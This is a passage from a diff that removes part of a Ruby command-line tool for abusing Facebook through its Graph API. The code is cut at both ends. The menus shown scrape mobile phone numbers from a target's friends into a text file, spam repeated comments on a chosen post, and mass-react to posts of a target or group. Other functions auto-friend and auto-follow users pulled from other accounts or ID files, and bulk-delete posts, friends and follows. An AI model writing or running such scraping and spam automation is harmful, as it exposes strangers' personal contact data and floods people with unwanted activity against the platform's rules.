-            puts ("#{$w}#{'═'*52}")
-          end
-        end
-      end
-      puts ("#{$g}[✓] Total phone : #{total}")
-      puts ("#{$g}[✓] File : #{File.basename(file)}")
-      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      GetMenu()
-    when '6'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Public Id : ")
-      id = gets.chomp!
-      a = Request("#{id}?")
-      if a.key? ('error')
-        puts ("#{$y}[!] User Not Found")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu()
-      else
-        tik ("#{$w}[+] From #{a['name']}")
-        b = Request("#{id}/friends?")
-        print ("#{$w}[+] Save File (file.txt) : ")
-        file = gets.chomp!
-        file = a['name'] + ".txt" if file == "" or file[0] == " "
-        File.open(file,"w") do |id|
-          puts ("#{$w}#{'═'*52}") 
-          for i in b['data']
-            c = Request("#{i['id']}?")
-            if c.key? ('mobile_phone')
-              total += 1
-              id << c['mobile_phone'] + "\n"
-              puts ("#{$g}[✓] Name : #{i['name']}")
-              puts ("#{$g}[✓] phone: #{c['mobile_phone']}")
-              puts ("#{$w}#{'═'*52}")
-            end
-          end
-        end
-        puts ("#{$g}[✓] Total phone : #{total}")
-        puts ("#{$g}[✓] File : #{File.basename(file)}")
-        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        GetMenu() 
-      end
-    when '0'
-      Hamker()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9) ; GetMenu()
-  end
-end
-
-def Bot()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Post Reaction")
-  puts ("#{$w}║-> 2. Post comments")
-  puts ("#{$w}║-> 3. Add Friend")
-  puts ("#{$w}║-> 4. Follow")
-  puts ("#{$w}║-> 5. Share Post")
-  puts ("#{$w}║-> 6. Delete Post")
-  puts ("#{$w}║-> 7. Unfriends")
-  puts ("#{$w}║-> 8. Unfollow")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  bots = gets.chomp!
-  case bots
-    when '1'
-      ReactPostMenu()
-    when '2'
-      CommentPostMenu()
-    when '3'
-      AddFriendMenu()
-    when '4'
-      FollowMenu()
-    when '5'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Post Id : ")
-      id = gets.chomp!
-      a = Request("#{id}?fields=from,id")
-      if !a.key? ('id')
-        puts ("#{$y}[!] Post Not Found")
-      else
-        SharePost(link = "https://www.facebook.com/#{id}")
-      end
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Bot()
-    when '6'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] From #{$name}")
-      puts ("#{$w}[+] CTRL + C TO STOP")
-      puts ("#{$w}[+] START..")
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/feed?limit=5000")
-      for i in a['data']
-        begin
-          id = i['id']
-          b = Request("DELETE","#{id}?")
-          if b == true
-            s += 1
-            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{$name} #{$w}-> #{$y}#{id}")
-          else
-            f += 1
-            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{$name} #{$w}-> #{$y}#{id}")
-          end
-        rescue Interrupt
-          puts ("\n#{$w}#{'═'*52}")
-          puts ("#{$r}[!] Stopped")
-          puts ("#{$g}[✓] Succes : #{s}")
-          puts ("#{$y}[!] Failed : #{f}")
-          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-          Bot()
-        end
-      end
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Succes : #{s}")
-      puts ("#{$y}[!] Failed : #{f}")
-      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Bot()
-    when '7'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] From #{$name}")
-      puts ("#{$w}[+] CTRL + C TO STOP")
-      puts ("#{$w}[+] START")
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/friends?")
-      if a.key? ('error')
-        puts (a)
-        abort ("#{$r}[!] Error")
-      else
-        for i in a['data']
-          begin
-            id = i['id']
-            name = i['name']
-            b = Request("DELETE","me/friends?uid=#{id}")
-            if b == true
-              s += 1
-              puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-            else
-              f += 1
-              puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-            end
-          rescue Interrupt
-            puts ("\n#{$w}#{'═'*52}")
-            puts ("#{$r}[!] Stopped")
-            puts ("#{$g}[✓] Succes : #{s}")
-            puts ("#{$y}[!] Failed : #{f}")
-            puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-            print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-            Bot()
-          end
-        end
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Succes : #{s}")
-        puts ("#{$y}[!] Failed : #{f}")
-        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Bot()
-      end
-    when '8'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] From #{$name}")
-      puts ("#{$w}[+] CTRL + C TO STOP")
-      puts ("#{$w}[+] START")
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/subscribedto?")
-      for i in a['data']
-        begin
-          id = i['id']
-          name = i['name']
-          b = Request("DELETE","#{id}/subscribers?")
-          if b == true
-            s += 1
-            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          else
-            f += 1
-            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          end
-        rescue Interrupt
-          puts ("\n#{$w}#{'═'*52}")
-          puts ("#{$r}[!] Stopped")
-          puts ("#{$g}[✓] Succes : #{s}")
-          puts ("#{$y}[!] Failed : #{f}")
-          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-          Bot()
-        end
-      end
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Succes : #{s}")
-      puts ("#{$y}[!] Failed : #{f}")
-      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Bot()
-    when '0'
-      menu()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      Bot()
-  end 
-end
-
-def ReactPostMenu()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Target Post Reaction")
-  puts ("#{$w}║-> 2. Group Post Reactions")
-  puts ("#{$w}║-> 3. Random Target Post Reaction")
-  puts ("#{$w}║-> 4. Random Group Post Reaction")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  mana = gets.chomp!
-  case mana 
-    when '0'
-      Bot()
-    when '1'
-      ReactPost()
-    when '2'
-      ReactGroup()
-    when '3'
-      ReactPostRandom()
-    when '4'
-      ReactGroupRandom()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9) ; ReactPostMenu()
-  end
-end
-
-def React()
-  loop do
-    system("clear")
-    puts ($logo)
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$w}║-> #{$p}1. LIKE")
-    puts ("#{$w}║-> #{$m}2. LOVE")
-    puts ("#{$w}║-> #{$y}3. HAHA")
-    puts ("#{$w}║-> #{$y}4. WOW")
-    puts ("#{$w}║-> #{$c}5. SAD")
-    puts ("#{$w}║-> #{$r}6. ANGRY")
-    puts ("#{$w}║")
-    print ("╚═#{$r}▶#{$w} ")
-    pilih = gets.chomp!
-    if pilih == '1' or pilih == '01'
-      return 'LIKE'
-    elsif pilih == '2' or pilih == '02'
-      return 'LOVE'
-    elsif pilih == '3' or pilih == '03'
-      return 'HAHA'
-    elsif pilih == '4' or pilih == '04'
-      return 'WOW'
-    elsif pilih == '5' or pilih == '05'
-      return 'SAD'
-    elsif pilih == '6' or pilih == '06'
-      return 'ANGRY'
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(1)
-    end
-  end
-end
-
-def ReactPost()
-  s = 0
-  f = 0
-  tipe = React()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Target Id : ")
-  id = gets.chomp! ; id = id.tr(" ","")
-  print ("#{$w}[+] Limits : ")
-  limit = gets.to_i
-  puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}?fields=feed.limit(#{limit})")
-  if !a.key? ('feed')
-    puts ("#{$y}[!] No Posts") if a.key? ('id')
-    puts ("#{$y}[!] user Not Found!") if a.key? ('error')
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    ReactPostMenu()
-  else
-    for i in a['feed']['data']
-      id = i['id']
-      a = Request("POST","#{id}/reactions?type=#{tipe}")
-      if !a.key? ('error')
-        s += 1 
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    ReactPostMenu()
-  end
-end
-
-def ReactPostRandom()
-  s = 0
-  f = 0
-  type = ['LIKE','LOVE','WOW','HAHA','ANGRY','SAD']
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Target Id : ")
-  id = gets.chomp! ; id = id.tr(" ","")
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}?fields=feed.limit(#{limit})")
-  if !a.key? ('feed')
-    puts ("#{$y}[!] No Posts") if a.key? ('id')
-    puts ("#{$y}[!] user Not Found!") if a.key? ('error')
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    ReactPostMenu()
-  else
-    for i in a['feed']['data']
-      tipe = type.sample
-      id = i['id']
-      b = Request("POST","#{id}/reactions?type=#{tipe}")
-      if !b.key? ('error')
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    ReactPostMenu()
-  end
-end
-
-def ReactGroup()
-  tipe = React()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Group Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  a = Request("group?id=#{id}")
-  if a.key? ('error')
-    puts ("#{$y}[!] Group Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    ReactPostMenu()
-  else
-    tik ("#{$w}[+] Group Name : #{a['name']}")
-    puts ("#{$w}#{'═'*52}")
-    b = Request("v3.0/#{id}?fields=feed.limit(#{limit})")
-    if !b.key? ('feed')
-      puts ("#{$y}[!] No Post")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      ReactPostMenu()
-    else
-      for i in b['feed']['data']
-        id = i['id']
-        c = Request("POST","#{id}/reactions?type=#{tipe}")
-        if !c.key? ('error')
-          s += 1
-          puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-        else
-          f += 1
-          puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-        end
-      end
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Succes : #{s}")
-      puts ("#{$y}[!] Failed : #{f}")
-      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      ReactPostMenu()
-    end
-  end
-end
-
-def ReactGroupRandom()
-  type = ['LIKE','LOVE','WOW','HAHA','ANGRY','SAD']
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Group Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  a = Request("group?id=#{id}")
-  if a.key? ('error')
-    puts ("#{$y}[!] Group Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    ReactPostMenu()
-  else
-    tik ("#{$w}[+] Group Name : #{a['name']}")
-    puts ("#{$w}#{'═'*52}")
-    b = Request("v3.0/#{id}?fields=feed.limit(#{limit})")
-    if !b.key? ('feed')
-      puts ("#{$y}[!] No Post")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      ReactPostMenu()
-    else
-      for i in b['feed']['data']
-        tipe = type.sample
-        id = i['id']
-        c = Request("POST","#{id}/reactions?type=#{tipe}")
-        if !c.key? ('error')
-          s += 1
-          puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-        else
-          f += 1
-          puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
-        end
-      end
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Succes : #{s}")
-      puts ("#{$y}[!] Failed : #{f}")
-      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      ReactPostMenu()
-    end
-  end
-end    
-
-def CommentPostMenu()
-  system("clear")
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Comment Target Post")
-  puts ("#{$w}║-> 2. Comment Group Post")
-  puts ("#{$w}║-> 3. Reply Comment")
-  puts ("#{$w}║-> 4. Spam Comment")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  mana = gets.chomp!
-  case mana
-    when'1'
-      CommentPost()
-    when '2'
-      CommentGroup()
-    when '3'
-      ReplyComment()
-    when '4'
-      SpamComment()
-    when '0'
-      Bot()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      CommentPostMenu()
-  end
-end
-
-def CommentPost()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}[!] Use <> For New Line")
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Target Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Comment : ")
-  body = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  puts ("#{$w}#{'═'*52}")
-  sub = body.tr("<>","\n")
-  msg = ERB::Util.url_encode(sub)
-  a = Request("#{id}?fields=feed.limit(#{limit})")
-  if !a.key? ('feed')
-    puts ("#{$y}[!] No Posts") if a.key? ('id')
-    puts ("#{$y}[!] user Not Found!") if a.key? ('error')
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  else
-    for i in a['feed']['data']
-      id = i['id']
-      b = Request("POST","#{id}/comments?message=#{msg}")
-      if !b.key? ('error')
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  end
-end
-
-def CommentGroup()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}[!] Use <> For New Line")
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Group Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Comment : ")
-  body = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  a = Request("group?id=#{id}")
-  if a.key? ('error')
-    puts ("#{$y}[!] Group Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  else
-    tik ("#{$w}[+] Group Name : #{a['name']}")
-    puts ("#{$w}#{'═'*52}")
-    b = Request("v3.0/#{id}?fields=feed.limit(#{limit})")
-    if !b.key? ('feed')
-      puts ("#{$y}[!] No Post")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      CommentPostMenu()
-    else
-      sub = body.tr("<>","\n")
-      msg = ERB::Util.url_encode(sub)
-      for i in b['feed']['data']
-        id = i['id']
-        c = Request("POST","#{id}/comments?message=#{msg}")
-        if !c.key? ('error')
-          s += 1
-          puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
-        else
-          f += 1
-          puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
-        end
-      end
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Succes : #{s}")
-      puts ("#{$y}[!] Failed : #{f}")
-      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      CommentPostMenu()
-    end
-  end
-end
-
-def ReplyComment()
-  system ('clear')
-  s = 0
-  f = 0
-  puts ($logo)
-  puts ("#{$w}[!] Use <> For New Line")
-  puts ("#{$w}[!] Use @tag to mention users")
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Post Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Comment : ")
-  body = gets.chomp!
-  #sub = body.gsub("<>","\n")
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}/comments?limit=#{limit}")
-  if !a.key? ('data')
-    puts ("#{$y}[!] Post Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  elsif a['data'].empty?
-    puts ("#{$y}[!] No Comments On Posts")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  else
-    for i in a['data']
-      id = i['id']
-      user = '@['+i['from']['id']+ ':]'
-      name = i['from']['name']
-      #puts user
-      sub = body.gsub("@tag",user)
-      msg = sub.gsub("<>","\n")
-      msg = ERB::Util.url_encode(msg)
-      b = Request("POST","#{id}/comments?message=#{msg}")
-      if !b.key? ('error')
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{name} #{$w}-> #{$y}#{id}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{name} #{$w}-> #{$y}#{id}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  end
-end
-    
-def SpamComment()
-  system ('clear')
-  s = 0
-  f = 0
-  puts ($logo)  
-  puts ("#{$w}[!] Use <> For New Line")
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Post Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Comment : ")
-  body = gets.chomp!
-  sub = body.tr("<>","\n")
-  msg = ERB::Util.url_encode(sub)
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  #puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}?")
-  if a.key? ('from')
-    tik ("#{$w}[+] Posted By #{a['from']['name']}")
-    puts ("#{$w}#{'═'*52}")
-    limit.times do
-      b = Request("POST","#{id}/comments?message=#{msg}")
-      if b.key? ('id')
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{body[0...8]}... #{$w}-> #{$y}#{id}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{body[0...8]}... #{$w}-> #{$y}#{id}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  else
-    puts ("#{$y}[!] Post Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  end
-end
-
-def AddFriendMenu()
-  system ("clear")
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Add Friend From Target Id")
-  puts ("#{$w}║-> 2. Add Friend From Friend")
-  puts ("#{$w}║-> 3. Add Friend From File Id")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  mana = gets.chomp!
-  case mana
-    when '1'
-      AddTarget()
-    when '2'
-      AddFrind()
-    when '3'
-      AddFile()
-    when '0'
-      Bot()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      AddFriendMenu()
-  end
-end
-
-def AddTarget()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Target Id : ")
-  id = gets.chomp!
-  a = Request("#{id}?")
-  tik ("#{$w}[+] Loading....")
-  puts ("#{$w}#{'═'*52}")
-  if a.key? ('name')
-    b = Request("POST","me/friends/#{id}?")
-    if b == true
-      puts ("#{$g}[✓] Name : #{a['name']}")
-      puts ("#{$g}[✓] Status : Success")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      AddFriendMenu()
-    else
-      puts ("#{$y}[!] Name : #{a['name']}")
-      puts ("#{$y}[!] Status : Failed")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      AddFriendMenu()
-    end
-  else
-    puts ("#{$y}[!] User Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    AddFriendMenu()
-  end
-end
-
-def AddFrind()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Public Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  tik ("#{$w}[+] Loading....")
-  puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}?fields=friends.limit(#{limit})")
-  if a.key? ('error')
-    puts ("#{$y}[!] User Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    AddFriendMenu()
-  elsif !a.key? ('friends')
-    puts ("#{$y}[!] There are no friends on the account")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    AddFriendMenu()
-  else
-    for i in a['friends']['data']
-      b = Request("POST","me/friends/#{i['id']}")
-      if b == true
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{i['name']} #{$w}-> #{$y}#{i['id']}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{i['name']} #{$w}-> #{$y}#{i['id']}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    AddFriendMenu()
-  end
-end
-
-def AddFile()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] File Id : ")
-  file = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  tik ("#{$w}[+] Loading....")
-  puts ("#{$w}#{'═'*52}")
-  if File.file? (file)
-    files = File.readlines(file, chomp: true).uniq
-    for i in files[0...limit]
-      a = Request("#{i}?")
-      next if a.key? ('error')
-      b = Request("POST","me/friends/#{i}?")
-      if b == true
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    AddFriendMenu()
-  else
-    puts ("#{$y}[!] File Not Found!")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    AddFriendMenu()
-  end
-end
-
-def FollowMenu()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Follow target Id")
-  puts ("#{$w}║-> 2. Follow From friend")
-  puts ("#{$w}║-> 3. Follow Friend from Friend")
-  puts ("#{$w}║-> 4. Follow From File Id")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  mana = gets.chomp!
-  case mana
-    when '1'
-      FollowTarget()
-    when '2'
-      FollowFriend()
-    when '3'
-      FollowFromFriend()
-    when '4'
-      FollowFile()
-    when '0'
-      Bot()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      FollowMenu()
-  end
-end
-
-def FollowTarget()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Target Id : ")
-  id = gets.chomp!
-  tik("#{$w}[+] Loading....")
-  puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}?")
-  if a.key? ('error')
-    puts ("#{$y}[!] User Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    FollowMenu()
-  else
-    b = Request("POST","#{id}/subscribers?")
-    if b == true
-      puts ("#{$g}[✓] Name : #{a['name']}")
-      puts ("#{$g}[✓] Status : Success")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      FollowMenu()
-    else
-      puts ("#{$y}[!] Name : #{a['name']}")
-      puts ("#{$y}[!] Status : Failed")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      FollowMenu()
-    end
-  end
-end
-
-def FollowFriend()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  tik ("#{$w}[+] Loading...")
-  puts ("#{$w}#{'═'*52}")
-  a = Request("me/friends?limit=#{limit}")
-  abort ("#{$y}[!] Error") if a.key? ('error')
-  for i in a['data']
-    id = i['id']
-    name = i['name']
-    b = Request("POST","#{id}/subscribers?")
-    if b == true
-      s += 1
-      puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-    else
-      f += 1
-      puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-    end
-  end
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$g}[✓] Succes : #{s}")
-  puts ("#{$y}[!] Failed : #{f}")
-  puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-  print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-  FollowMenu()
-end
-
-def FollowFromFriend()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
